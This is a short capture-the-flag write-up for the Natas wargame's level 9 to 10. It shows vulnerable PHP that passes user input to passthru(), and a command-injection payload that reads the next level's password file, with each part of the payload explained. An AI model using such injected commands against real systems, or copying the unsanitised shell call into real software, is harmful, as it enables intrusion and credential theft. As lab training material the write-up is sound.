# Natas Level 9 -> 10

## Goal

Find the password for natas10.

## Key Concept

Command injection via PHP `passthru()`.

## Solution

The page shows PHP source code that passes user input directly to a shell command:

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

Since `$key` is not sanitized, we can inject arbitrary commands. The payload:

```
; echo $(cat /etc/natas_webpass/natas10) #
```

Breaking it down:
1. `;` - terminates the `grep` command gracefully (with empty output)
2. `echo $(cat /etc/natas_webpass/natas10)` - our injected command to read the password
3. `#` - comments out the rest (`dictionary.txt`) to avoid errors

`solve.py`

```bash
uv run level09/solve.py
```
